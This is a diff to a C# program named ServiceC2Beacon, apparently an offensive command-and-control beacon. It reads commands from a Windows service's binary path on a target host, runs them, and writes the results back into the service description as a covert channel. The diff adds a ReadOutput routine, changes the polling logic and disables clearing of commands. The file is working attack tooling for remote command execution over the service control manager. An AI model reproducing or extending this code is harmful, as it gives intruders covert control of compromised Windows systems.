@@ -1,9 +1,6 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Management;
 using System.Runtime.InteropServices;
-using System.ServiceProcess;
 
 namespace ServiceC2Beacon
 {
@@ -13,52 +10,6 @@ namespace ServiceC2Beacon
         public static IntPtr schService = IntPtr.Zero;
         public static IntPtr schSCManager = IntPtr.Zero;
 
-        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
-        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
-
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
-
-        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
-
-        [DllImport("advapi32", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
-
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        public static extern bool CloseServiceHandle(IntPtr hService);
-
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct SERVICE_DESCRIPTION
-        {
-            public string lpDescription;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct QUERY_SERVICE_CONFIG
-        {
-            public int serviceType;
-            public int startType;
-            public int errorControl;
-            public IntPtr binaryPathName;
-            public IntPtr loadOrderGroup;
-            public int tagID;
-            public IntPtr dependencies;
-            public IntPtr startName;
-            public IntPtr displayName;
-        }
-
-        [DllImport("kernel32.dll")]
-        static extern uint GetLastError();
 
         public static int GetSleepTime(string host, string serviceName)
         {
@@ -74,7 +25,6 @@ namespace ServiceC2Beacon
                     Environment.Exit(1);
                 }
             }
-            QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();
 
             uint dwBytesNeeded = 0;
             QueryServiceConfigA(schService, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
@@ -82,17 +32,19 @@ namespace ServiceC2Beacon
             bool result = QueryServiceConfigA(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
             if (result)
             {
+                QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();
                 service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                 sleepTime = Int32.Parse(Marshal.PtrToStringAnsi(service_config.displayName));
-                Console.WriteLine("Sleep: " + sleepTime);
             }
             Marshal.FreeHGlobal(ptr);
 
             return sleepTime;
         }
 
-        public static void ClearCommand(string host, string serviceName)
+        public static string ReadOutput(string host, string serviceName)
         {
+            string output = "";
+
             if (schService == IntPtr.Zero)
             {
                 Console.WriteLine("Lost handle... Trying to reestablish");
@@ -103,12 +55,34 @@ namespace ServiceC2Beacon
                     Environment.Exit(1);
                 }
             }
-            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, "", null, null, null, null, null, null);
-            if (!success)
+
+            IntPtr buffer = IntPtr.Zero;
+            uint dwBytesNeeded = 0;
+
+            bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
+            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
+            result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
+
+            if (dwBytesNeeded <= 4)
             {
-                Console.WriteLine("[-] Failed to clear command");
+                return output;
             }
 
+            if (result)
+            {
+                SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();
+
+                try
+                {
+                    service_description = (SERVICE_DESCRIPTION)Marshal.PtrToStructure(ptr, new SERVICE_DESCRIPTION().GetType());
+                    output = service_description.lpDescription;
+                }
+                catch 
+                {
+                }
+            }
+            Marshal.FreeHGlobal(ptr);
+            return output;
         }
 
         public static string GetCommand(string host, string serviceName)
@@ -136,11 +110,10 @@ namespace ServiceC2Beacon
             {
                 service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                 cmd = Marshal.PtrToStringAnsi(service_config.binaryPathName);
-                Console.WriteLine("Command: " + cmd);
             }
             Marshal.FreeHGlobal(ptr);
 
-            ClearCommand(host, serviceName);
+            //ClearCommand(host, serviceName);
 
             return cmd;
         }
@@ -202,7 +175,7 @@ namespace ServiceC2Beacon
         public static bool PostOutput(string host, string serviceName, string output)
         {
             if (schService == IntPtr.Zero)
-            {
+            {   
                 Console.WriteLine("Lost handle... Trying to reestablish");
                 ConnectToService(host, serviceName);
                 if (schService == IntPtr.Zero)
@@ -229,7 +202,6 @@ namespace ServiceC2Beacon
             {
                 Console.WriteLine("[-] Output update failed");
             }
-            Console.WriteLine("[+] Output updated successfully");
 
             return success;
         }
@@ -273,16 +245,67 @@ namespace ServiceC2Beacon
                         Environment.Exit(0);
                     }
 
-                    if (command.Length > 0)
+                    string lastOutput = ReadOutput(host, serviceName);
+
+                    if (lastOutput.Length <= 0 && !command.Equals("Ready"))
                     {
+                        Console.WriteLine("[+] Received new command: " + command);
                         string output = RunCommand(command);
                         PostOutput(host, serviceName, output);
                     }
-
                     stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, serviceName));
                 }
             }
             DisconnectFromService();
         }
+
+
+        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);
+
+        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool CloseServiceHandle(IntPtr hService);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        public static extern Boolean QueryServiceConfig2A(IntPtr hService, UInt32 dwInfoLevel, IntPtr buffer, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct SERVICE_DESCRIPTION
+        {
+            public string lpDescription;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct QUERY_SERVICE_CONFIG
+        {
+            public int serviceType;
+            public int startType;
+            public int errorControl;
+            public IntPtr binaryPathName;
+            public IntPtr loadOrderGroup;
+            public int tagID;
+            public IntPtr dependencies;
+            public IntPtr startName;
+            public IntPtr displayName;
+        }
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
+
     }
 }
